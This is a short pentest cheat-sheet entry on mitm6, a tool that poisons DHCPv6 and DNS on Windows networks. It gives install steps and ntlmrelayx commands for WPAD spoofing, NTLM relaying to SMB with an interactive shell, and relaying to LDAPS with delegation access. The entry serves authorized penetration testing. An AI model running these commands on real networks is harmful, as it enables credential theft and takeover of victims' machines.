# mitm6

mitm6 is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server. It does this by replying to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server. As DNS server, mitm6 will selectively reply to DNS queries of the attackers choosing and redirect the victims traffic to the attacker machine instead of the legitimate server. For a full explanation of the attack, see our [blog about mitm6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/). Mitm6 is designed to work together with [ntlmrelayx from impacket](https://github.com/CoreSecurity/impacket) for WPAD spoofing and credential relaying. 

Link: [https://github.com/fox-it/mitm6](https://github.com/fox-it/mitm6) 

**Install**: 

```text
git clone https://github.com/fox-it/mitm6.git && cd mitm6 
pip install .
```

 **Usage:**

```text
mitm6 -d lab.local 
ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i 
# -wh: Server hosting WPAD file (Attacker’s IP) 
# -t: Target (You cannot relay credentials to the same device that you’re spoofing) 
# -i: open an interactive shell 
ntlmrelayx.py -t ldaps://lab.local -wh attacker-wpad --delegate-access 
```



